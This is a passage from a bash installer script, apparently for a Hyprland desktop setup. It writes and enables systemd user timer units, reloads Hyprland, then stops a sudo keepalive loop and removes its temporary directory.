After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=$exec_path
SERVICEEOF

    cat > "$HOME/.config/systemd/user/$unit.timer" << TIMEREOF
[Unit]
Description=$desc — timer

[Timer]
OnBootSec=$on_boot
OnUnitActiveSec=$interval
Persistent=true

[Install]
WantedBy=timers.target
TIMEREOF
done

XDG_RUNTIME_DIR="/run/user/$(id -u "$CURRENT_USER")" systemctl --user daemon-reload 2>/dev/null || true
for unit in "${!TIMERS[@]}"; do
    XDG_RUNTIME_DIR="/run/user/$(id -u "$CURRENT_USER")" systemctl --user enable --now "$unit.timer" 2>/dev/null || true
done

# ─── RELOAD HYPRLAND ──────────────────────────────────────────────────

echo ""
echo "  Reloading Hyprland..."
hyprctl reload 2>/dev/null && echo -e "  ${G}✓${N} Hyprland reloaded" || echo -e "  ${Y}!${N} Hyprland not running"

# ─── CLEANUP ──────────────────────────────────────────────────────────

# Kill sudo keepalive background loop
[ -n "${SUDO_KEEPALIVE_PID:-}" ] && kill "$SUDO_KEEPALIVE_PID" 2>/dev/null

rm -rf "$TMP_DIR"

SCRIPT_END=$(date +%s)
DURATION=$((SCRIPT_END - SCRIPT_START))

